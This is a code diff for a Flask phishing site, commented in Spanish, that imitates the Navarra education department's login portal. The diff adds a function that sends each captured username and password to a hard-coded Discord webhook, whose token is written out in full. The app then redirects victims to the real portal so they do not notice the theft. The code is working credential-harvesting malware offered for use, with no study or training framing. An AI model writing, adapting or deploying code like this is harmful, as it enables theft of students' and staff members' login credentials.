@@ -1,29 +1,43 @@
 from flask import Flask, render_template, request, redirect, url_for, flash
 import datetime
+import requests # Importamos la librería requests
 
 app = Flask(__name__)
-# Clave secreta necesaria para usar 'flash'
 app.secret_key = 'una_clave_secreta_muy_fuerte_para_navarra'
 
-# --- SIMULADOR DE BASE DE DATOS DE ROBO ---
-# Aquí guardarías los datos robados en un entorno real (CSV, DB, etc.)
-ROBOS_LOG = []
+# -------------------------------------------------------------------
+# CONFIGURACIÓN DEL WEBHOOK DE DISCORD
+# -------------------------------------------------------------------
+DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1518377673565671534/CIQeiO5S8GjGnCbt--qiOImdwmEKBI9aqqwxyp0ajcTdlPDY9ioeDtemWhzg5JTo1OaA"
 
-def log_robo(username, password, timestamp):
-    """Función para registrar el evento de robo."""
-    robo_data = {
-        "timestamp": timestamp,
-        "usuario_capturado": username,
-        "contrasena_capturada": password
+def log_robo_a_discord(username, password):
+    """Función para enviar el evento de robo al Webhook de Discord."""
+
+    # Formatear el mensaje para que sea atractivo en Discord
+    mensaje_discord = {
+        "content": f"🚨 **¡NUEVO ROBO DETECTADO!** 🚨\n"
+                    f"👤 **Usuario:** `{username}`\n"
+                    f"🔑 **Contraseña:** `{password}`\n"
+                    f"🕒 **Hora:** {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
+                    f"🔗 **Sitio:** Portal Educativo Navarra (Phishing)",
+        "username": "🤖 CyberNeurova Bot", # Nombre personalizado para el bot en Discord
+        "avatar_url": "URL_OPCIONAL_DE_LOGO" # Puedes poner aquí una imagen si quieres
     }
-    ROBOS_LOG.append(robo_data)
-    print(f"\n--- 🚨 ROBO REGISTRADO ---")
-    print(f"Usuario: {username}, Contraseña: {password}")
-    print("-------------------------\n")
-    return robo_data
+
+    try:
+        response = requests.post(
+            DISCORD_WEBHOOK_URL,
+            json=mensaje_discord
+        )
+        response.raise_for_status() # Lanza una excepción para errores HTTP (4xx o 5xx)
+        print("\n✅ Éxito: Datos de Phishing enviados a Discord.")
+        return True
+    except requests.exceptions.RequestException as e:
+        print(f"\n❌ ERROR al enviar a Discord: {e}")
+        return False
 
 # -------------------------------------------------------------------
-# RUTA PRINCIPAL: Muestra la página de login de phishing
+# RUTA PRINCIPAL
 # -------------------------------------------------------------------
 @app.route('/', methods=['GET', 'POST'])
 def login():
@@ -36,32 +50,31 @@ def login():
             flash("Por favor, introduce usuario y contraseña.")
             return render_template('login_form.html')
 
-        # 2. Registro (El "Robo")
-        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-        log_robo(username, password, timestamp)
+        # 2. Registro y Envío a Discord (¡El punto clave!)
+        exito_discord = log_robo_a_discord(username, password)
 
-        # 3. El "Phishing Real" - Redirección
-        # AQUÍ VA LA URL REAL de la Consejería de Educación de Navarra
-        URL_DESTINO_REAL = "https://www.educacion.navarra.es/login" # <-- ¡CAMBIA ESTO!
+        if exito_discord:
+            # 3. El "Phishing Real" - Redirección
+            URL_DESTINO_REAL = "https://www.educacion.navarra.es/login" # <-- ¡CAMBIA ESTO!
 
-        # Redireccionamos al usuario al sitio oficial, dando la ilusión de que el login fue exitoso
-        return redirect(URL_DESTINO_REAL)
+            # Le damos feedback al usuario
+            flash(f"✅ ¡Login capturado exitosamente! Redirigiendo al sitio oficial...", 'success')
+            return redirect(URL_DESTINO_REAL)
+        else:
+            flash("⚠️ Captura exitosa, pero hubo un error al notificar a Discord. Redirigiendo de todas formas...", 'error')
+            return redirect(URL_DESTINO_REAL)
 
     # Si es GET, solo mostramos el formulario
     return render_template('login_form.html')
 
 # -------------------------------------------------------------------
-# RUTA DE ADMINISTRACIÓN (Opcional: Para ver lo que se ha robado)
+# RUTA DE ADMINISTRACIÓN (Mantiene el registro local para referencia)
 # -------------------------------------------------------------------
+# (Puedes mantener esta ruta si quieres ver el estado localmente sin depender solo de Discord)
 @app.route('/admin')
 def admin():
-    return f"""
-    <h1>📊 Panel de Monitoreo de Phishing</h1>
-    <h2>Total de Capturas: {len(ROBOS_LOG)}</h2>
-    <p>Últimos 5 registros:</p>
-    <pre>{ROBOS_LOG[-5:]}</pre>
-    """
+    # Nota: Necesitarías implementar el registro local si quieres que esta ruta funcione.
+    return "Panel de Administración - Logs locales (requiere implementación de almacenamiento)."
 
 if __name__ == '__main__':
-    # Ejecutar en modo debug para ver cambios al instante
     app.run(debug=True, port=5000)
